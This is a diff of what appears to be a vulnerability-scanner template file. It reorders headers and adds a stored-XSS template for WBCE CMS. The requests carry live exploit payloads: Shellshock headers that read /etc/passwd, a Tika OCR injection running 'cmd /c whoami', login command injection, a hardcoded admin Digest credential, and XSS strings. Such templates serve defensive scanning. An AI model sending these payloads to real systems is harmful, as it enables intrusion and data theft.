@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6403,11 +6403,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -11141,8 +11141,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -16118,8 +16118,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -19268,6 +19268,23 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-30073",
+      "info": {
+        "name": "WBCE CMS v1.5.2 XSS Stored",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/login/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nurl=&username_fieldname=username_axh5kevh&password_fieldname=password_axh5kevh&username_axh5kevh={{username}}&password_axh5kevh={{password}}&submit=Login\n",
+            "GET /admin/users/index.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /admin/users/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nformtoken={{formtoken}}&user_id=&username_fieldname=username_tep83j9z&username_tep83j9z=testme2&password=temp1234&password2=temp1234&display_name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&email=testme2%40abc.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=\n",
+            "GET /admin/users/index.php HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
